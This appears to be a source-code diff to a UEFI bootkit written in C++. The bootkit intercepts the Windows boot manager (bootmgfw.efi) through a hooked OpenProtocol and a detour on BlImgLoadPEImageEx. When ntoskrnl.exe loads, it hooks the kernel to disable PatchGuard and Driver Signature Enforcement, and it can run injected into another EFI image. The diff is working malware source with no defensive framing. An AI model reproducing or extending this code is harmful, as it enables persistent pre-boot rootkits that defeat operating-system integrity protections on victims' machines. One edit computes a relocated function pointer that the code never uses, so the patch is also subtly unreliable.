@@ -1,5 +1,4 @@
 #include "Efi.hpp"
-#include "EfiUtils.hpp"
 
 static void DisablePatchGuard(void* ImageBase, uint64_t ImageSize)
 {
@@ -97,8 +96,23 @@ static void HookNtoskrnl(void* ImageBase, uint64_t ImageSize)
     DisableDSE(ImageBase, ImageSize);
 }
 
+static bool IsNtoskrnl(const wchar_t* ImageName)
+{
+    static const wchar_t Ntoskrnl[] = L"ntoskrnl.exe";
+    static const size_t NtoskrnlLen = ARRAY_SIZE(Ntoskrnl) - 1;
+
+    size_t ImageNameLen = wcslen(ImageName);
+    if (ImageNameLen < NtoskrnlLen)
+    {
+        return false;
+    }
+
+    return memcmp(&ImageName[ImageNameLen - NtoskrnlLen], Ntoskrnl, NtoskrnlLen * sizeof(wchar_t)) == 0;
+}
+
+typedef EFI_STATUS (*BlImgLoadPEImageEx_t)(void*, void*, wchar_t*, void**, uint64_t*, void*, void*, void*, void*, void*, void*, void*, void*, void*);
 static BlImgLoadPEImageEx_t BlImgLoadPEImageEx = nullptr;
-static uint8_t BlImgLoadPEImageExOriginal[JmpSize];
+static uint8_t BlImgLoadPEImageExOriginal[DetourSize];
 
 static EFI_STATUS BlImgLoadPEImageExHook(void* a1, void* a2, wchar_t* LoadFile, void** ImageBase, uint64_t* ImageSize, void* a6, void* a7, void* a8, void* a9, void* a10, void* a11, void* a12, void* a13, void* a14)
 {
@@ -110,8 +124,8 @@ static EFI_STATUS BlImgLoadPEImageExHook(void* a1, void* a2, wchar_t* LoadFile, 
 
     DetourCreate(BlImgLoadPEImageEx, BlImgLoadPEImageExHook, BlImgLoadPEImageExOriginal);
 
-    // Check if load file is ntoskrnl and hook it
-    if (GetExport(*ImageBase, "NtCreateFile", "ntoskrnl.exe") != nullptr)
+    // Check if loaded file is ntoskrnl and hook it
+    if (!EFI_ERROR(Status) && IsNtoskrnl(LoadFile))
     {
         HookNtoskrnl(*ImageBase, *ImageSize);
     }
@@ -126,7 +140,7 @@ OpenProtocolHook(EFI_HANDLE Handle, EFI_GUID* Protocol, void** Interface, EFI_HA
 {
     auto Status = OpenProtocol(Handle, Protocol, Interface, AgentHandle, ControllerHandle, Attributes);
 
-    // Find the calling modules image base
+    // Find the calling module's image base
     if (auto ImageBase = FindImageBase((uint64_t)_ReturnAddress()))
     {
         // Find and hook BlImgLoadPEImageEx
@@ -144,16 +158,21 @@ OpenProtocolHook(EFI_HANDLE Handle, EFI_GUID* Protocol, void** Interface, EFI_HA
     return Status;
 }
 
-static EFI_STATUS LoadBootmgfw()
+static void HookBootServices()
+{
+    // Hook open protocol
+    OpenProtocol = gBS->OpenProtocol;
+    gBS->OpenProtocol = OpenProtocolHook;
+}
+
+static EFI_STATUS LoadBootManager()
 {
     // Query bootmgfw from the filesystem
     EFI_DEVICE_PATH* BootmgfwPath = nullptr;
-    auto Status = QueryDevicePath(L"\\efi\\microsoft\\boot\\bootmgfw.efi", &BootmgfwPath);
+    auto Status = EfiQueryDevicePath(L"\\efi\\microsoft\\boot\\bootmgfw.efi", &BootmgfwPath);
 
     if (EFI_ERROR(Status))
     {
-        gST->ConOut->OutputString(gST->ConOut, L"Failed to query bootmgfw.efi\r\n");
-
         return Status;
     }
 
@@ -164,18 +183,17 @@ static EFI_STATUS LoadBootmgfw()
 
     if (EFI_ERROR(Status))
     {
-        gST->ConOut->OutputString(gST->ConOut, L"Failed to load bootmgfw.efi\r\n");
-
         return Status;
     }
+
+    // Install boot services hook
+    HookBootServices();
 
     // Start the boot manager
     Status = gBS->StartImage(BootmgfwHandle, nullptr, nullptr);
 
     if (EFI_ERROR(Status))
     {
-        gST->ConOut->OutputString(gST->ConOut, L"Failed to start bootmgfw.efi\r\n");
-
         gBS->UnloadImage(BootmgfwHandle);
     }
 
@@ -184,7 +202,7 @@ static EFI_STATUS LoadBootmgfw()
 
 EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
 {
-    InitializeGlobals(ImageHandle, SystemTable);
+    EfiInitializeGlobals(ImageHandle, SystemTable);
 
     // Get the EFI image base
     EFI_LOADED_IMAGE* EfiImage = nullptr;
@@ -194,24 +212,28 @@ EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable
         return Status;
     }
 
-    // Install boot services hook
-    OpenProtocol = gBS->OpenProtocol;
-    gBS->OpenProtocol = OpenProtocolHook;
-
     // Check if we are currently running as an injected section
-    if (EfiImage->ImageBase != &__ImageBase)
+    auto ImageBase = &__ImageBase;
+    if (EfiImage->ImageBase != ImageBase)
     {
+        // Install boot services hook
+        HookBootServices();
+
         // Call the original entry point (embedded in the bootkit PE)
-        auto NtHeaders = GetNtHeaders(&__ImageBase);
+        auto NtHeaders = GetNtHeaders(ImageBase);
         auto OriginalEntryRva = NtHeaders->OptionalHeader.AddressOfEntryPoint;
         auto OriginalEntry = RVA<decltype(&EfiEntry)>(EfiImage->ImageBase, OriginalEntryRva);
 
         Status = OriginalEntry(ImageHandle, SystemTable);
     }
-    else
+    // Relocate the image to a new base
+    else if (auto NewImageBase = EfiRelocateImage(ImageBase))
     {
-        // Try to load bootmgfw normally
-        Status = LoadBootmgfw();
+        // Call the relocated LoadBootManager
+        auto RelocLoadBootManagerRva = ((uint64_t)&LoadBootManager - (uint64_t)ImageBase);
+        auto RelocLoadBootManager = RVA<decltype(&LoadBootManager)>(NewImageBase, RelocLoadBootManagerRva);
+
+        Status = LoadBootManager();
     }
 
     return Status;
